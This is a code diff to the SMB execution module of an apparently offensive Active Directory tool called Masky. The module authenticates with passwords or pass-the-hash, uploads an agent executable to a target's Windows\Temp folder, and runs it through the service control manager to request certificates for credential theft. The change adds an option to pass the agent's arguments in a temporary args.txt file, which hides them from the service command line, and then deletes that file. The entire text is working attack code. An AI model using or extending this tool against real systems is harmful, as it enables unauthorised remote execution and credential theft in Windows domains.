@@ -2,6 +2,7 @@ import logging
 import string
 import random
 from .results import MaskyResults
+from ..utils.toolbox import FakeBufferReader
 from pkg_resources import resource_filename
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.smbconnection import SMBConnection
@@ -23,6 +24,7 @@ class Smb:
         aeskey=None,
         stealth=False,
         exe_path=None,
+        file_args=False,
     ):
         self.__tracker = tracker
         self.__domain = domain
@@ -30,7 +32,8 @@ class Smb:
         self.__password = password
         self.__lmhash, self.__nthash = "", ""
         self.__stealth = stealth
-        self._exe_path = exe_path
+        self.__exe_path = exe_path
+        self.__file_args = file_args
 
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(":")
@@ -49,6 +52,7 @@ class Smb:
 
         self.__port = 445
         self.__share = "C$"
+
         self.__error_filename = (
             f"{''.join(random.choices(string.ascii_lowercase, k=8))}.png"
         )
@@ -58,13 +62,18 @@ class Smb:
         self.__agent_filename = (
             f"{''.join(random.choices(string.ascii_lowercase, k=8))}.exe"
         )
+        self.__args_filename = "args.txt"
+
         self.__masky_remote_path = f"\\Windows\\Temp\\{self.__agent_filename}"
         self.__results_remote_path = f"\\Windows\\Temp\\{self.__output_filename}"
         self.__errors_remote_path = f"\\Windows\\Temp\\{self.__error_filename}"
-        if self._exe_path:
-            self.__masky_local_path = self._exe_path
+        self.__args_path = f"\\Windows\\Temp\\{self.__args_filename}"
+
+        if self.__exe_path:
+            self.__masky_local_path = self.__exe_path
         else:
             self.__masky_local_path = resource_filename("masky.bin", "Masky.exe")
+
         logger.debug(
             f"The Masky agent binary will be uploaded in: {self.__masky_remote_path}"
         )
@@ -74,12 +83,18 @@ class Smb:
         logger.debug(
             f"The Masky agent errors will be stored in: {self.__errors_remote_path}"
         )
+        logger.debug(
+            f"The Masky agent arguments will be uploaded in: {self.__args_path}"
+        )
+
         self.__tracker.agent_filename = self.__agent_filename
         self.__tracker.output_filename = self.__output_filename
         self.__tracker.error_filename = self.__error_filename
+        self.__tracker.args_filename = self.__args_filename
 
     def exec_masky(self, target, ca, template):
         try:
+            self.__command = f'{self.__masky_remote_path} /ca:"{ca}" /template:"{template}" /output:"{self.__results_remote_path}" /debug:"{self.__errors_remote_path}"'
             self.__upload_masky(target)
             logger.debug(
                 f"Masky agent was successfuly uploaded in: '{self.__masky_remote_path}'"
@@ -98,7 +113,6 @@ class Smb:
             self.__tracker.last_error_msg = err_msg
             raise Exception
         try:
-            self.__command = f'{self.__masky_remote_path} /ca:"{ca}" /template:"{template}" /output:"{self.__results_remote_path}" /debug:"{self.__errors_remote_path}"'
             self.__init_rpc(target)
             self.__init_scmr()
             if self.__stealth:
@@ -155,6 +169,14 @@ class Smb:
             )
         with open(self.__masky_local_path, "rb") as p:
             smbclient.putFile(self.__share, self.__masky_remote_path, p.read)
+
+        if self.__file_args:
+            FakeBufferReader.string = self.__command
+            smbclient.putFile(
+                self.__share, self.__args_path, FakeBufferReader.get_string
+            )
+            self.__command = f"{self.__masky_remote_path}"
+
         smbclient.close()
         logger.result(
             "Current user seems to be local administrator, attempting to run Masky agent..."
@@ -180,6 +202,7 @@ class Smb:
                 self.__lmhash,
                 self.__nthash,
             )
+
         try:
             smbclient.deleteFile(self.__share, self.__masky_remote_path)
         except:
@@ -187,6 +210,16 @@ class Smb:
             logger.warn(
                 f"Fail to remove Masky agent located in: {self.__masky_remote_path}"
             )
+
+        if self.__file_args:
+            try:
+                smbclient.deleteFile(self.__share, self.__args_path)
+            except:
+                self.__tracker.files_cleaning_success = False
+                logger.warn(
+                    f"Fail to remove Masky agent arguments file located in: {self.__args_path}"
+                )
+
         smbclient.close()
 
     def __process_results(self, target_host):
